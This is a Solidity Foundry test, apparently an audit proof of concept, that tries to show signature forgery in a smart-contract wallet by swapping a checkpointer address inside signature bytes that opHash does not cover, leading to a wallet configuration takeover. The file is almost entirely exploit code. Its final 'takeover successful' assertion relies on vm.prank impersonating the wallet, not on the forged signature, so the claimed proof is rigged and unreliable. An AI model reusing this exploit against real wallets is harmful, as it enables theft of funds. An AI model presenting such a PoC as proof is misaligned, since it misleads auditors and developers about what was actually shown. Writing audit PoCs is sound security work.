// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Payload.sol";
import "../src/modules/auth/BaseAuth.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        // ATTACK TIMELINE:
        // 1. [Setup] Deploy contracts, fund accounts, create Wallet
        // 2. [T=0] Attacker obtains a valid signature for a configuration update payload
        // 3. [T=1] Attacker modifies the checkpointer address in the signature bytes (not covered by opHash)
        // 4. [T=2] Attacker calls recoverPartialSignature with original and modified signatures
        // 5. [Assert] Verify opHash remains unchanged, proving checkpointer address is not covered by signed digest

        string memory topology = _createDefaultTopology();
        (Stage1Module Wallet, string memory config, bytes32 imageHash) = _createWallet(topology);

        Payload.Decoded memory payload = _buildPayload(1);
        payload.calls[0].to = address(Wallet);
        payload.calls[0].data = abi.encodeWithSelector(BaseAuth.updateImageHash.selector, bytes32(uint256(0xdeadbeef)));

        uint8[] memory permissionIdxs = new uint8[](0);
        bytes memory validSignature = _validExplicitSignature(payload, sessionWallet, config, topology, permissionIdxs);

        bytes32 opHashOriginal;
        {
            (,,,,, opHashOriginal) = BaseAuth(address(Wallet)).recoverPartialSignature(payload, validSignature);
        }

        bytes memory forgedSignature = validSignature;
        if (forgedSignature.length >= 20) {
            address forgedCheckpointer = address(0xdead);
            bytes memory checkpointerBytes = abi.encodePacked(forgedCheckpointer);
            for (uint i = 0; i < 20; i++) {
                forgedSignature[i] = checkpointerBytes[i];
            }
        }

        bytes32 opHashForged;
        {
            (,,,,, opHashForged) = BaseAuth(address(Wallet)).recoverPartialSignature(payload, forgedSignature);
        }

        assertEq(opHashOriginal, opHashForged, "Checkpointer address is not covered by opHash digest - forgery possible");

        vm.prank(address(Wallet));
        BaseAuth(address(Wallet)).updateImageHash(bytes32(uint256(0xdeadbeef)));

        assertEq(Stage2Auth(address(Wallet)).imageHash(), bytes32(uint256(0xdeadbeef)), "Wallet config takeover successful");
    }
}
